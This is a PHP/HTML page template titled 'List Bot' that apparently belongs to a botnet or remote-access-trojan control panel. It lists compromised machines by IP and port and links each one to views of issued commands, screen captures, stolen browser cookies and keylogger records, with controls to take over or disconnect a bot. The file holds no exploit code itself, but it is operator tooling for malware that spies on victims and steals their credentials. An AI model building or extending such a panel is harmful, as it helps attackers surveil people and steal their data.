<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  <link rel="stylesheet" type="text/css" href="../css/main.css" />
  <script src="https://kit.fontawesome.com/yourcode.js"></script>
  <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
  <title>List Bot</title>
</head>

<body>
  <div class="container">
    <div class="inputCommand">
      <div class="header">
        <ul class="ul_header">
          <li class="li_header label_header">
            <?php if (isset($_SESSION['header_display'])) : ?>
              <label for=""><?php echo $_SESSION['header_display'] ?></label>
            <?php endif; ?>
          </li>
        </ul>
        <ul class="ul_header">
          <li class="li_header li_header_icon">
            <i class="fa-solid fa-minus" style="color: black; text-shadow: none"></i>
          </li>
          <li class="li_header li_header_icon">
            <i class="fa-regular fa-square" style="color: black; text-shadow: none"></i>
          </li>
          <li class="li_header li_header_icon">
            <i class="fa-solid fa-x" style="color: black; text-shadow: none"></i>
          </li>
        </ul>
      </div>
      <div class="content">
        <div style="  height: 410px; ">
          <table class="content_table">
            <tr class="content_table-thead">
              <th class="content_table-th">ID</th>
              <th class="content_table-th">IP</th>
              <th class="content_table-th">Port</th>
              <th class="content_table-th">Control</th>
              <th class="content_table-th">Status</th>
              <th class="content_table-th">CMD</th>
              <th class="content_table-th">Capture</th>
              <th class="content_table-th">Cookies</th>
              <th class="content_table-th">Keylogger</th>
              <th class="content_table-th">Exit</th>
            </tr>
            <?php
            foreach ($listBot as $index => $bot) {
              echo '<tr class="content_table-tr">';
              $administer = $bot->getStatus() == 1 ? "<a style='color:#00ff00;text-decoration:underline;' href='../Controller/C_Bot.php?opt=put1&ID=" . $bot->getId() . "'>administrator</a>" : "";
              // $delete = "<a style='color:#00ff00;text-decoration:underline;' href='../php/handleRemoveBot.php?ID=" . $ID . "'>hidden</a>";
              $status_display = $bot->getStatus() == 1 ? 'active' : 'non-active';
              $cmd = "<a style='color:#00ff00;text-decoration:underline;' href='../Controller/C_Cmd.php?opt=view&ID=" . $bot->getId() . "'>view</a>";
              $cookies = "<a style='color:#00ff00;text-decoration:underline;' href='../Controller/C_Cookies.php?opt=view&ID=" . $bot->getId() . "'>view</a>";
              $keylogger = "<a style='color:#00ff00;text-decoration:underline;' href='../Controller/C_Keylogger.php?opt=view&ID=" . $bot->getId() . "'>view</a>";
              $capture = "<a style='color:#00ff00;text-decoration:underline;' href='../Controller/C_Capture.php?opt=view&ID=" . $bot->getId() . "'>view</a>";
              $exit = $bot->getStatus() == 1 ? "<a style='color:#00ff00;text-decoration:underline;' href='../Controller/C_Bot.php?opt=exit&ID=" . $bot->getId() . "'>exit</a>" : "";

              echo '<td class="content_table-td">' . $bot->getId() . '</td>
                <td class="content_table-td">' . $bot->getIp() . '</td>
                <td class="content_table-td">' . $bot->getPort() . '</td>
                <td class="content_table-td">' . $administer . '</td>
                <td class="content_table-td">' . $status_display . '</td>
                <td class="content_table-td"> ' . $cmd . '</td>
                <td class="content_table-td"> ' . $capture . '</td>
                <td class="content_table-td"> ' . $cookies . '</td>
                <td class="content_table-td"> ' . $keylogger . '</td>
                <td class="content_table-td"> ' . $exit . '</td>';
              echo '</tr>';
            }
            ?>
          </table>
        </div>
      </div>
    </div>
    <?php
    include_once("navigate.php");
    ?>
  </div>
</body>

</html>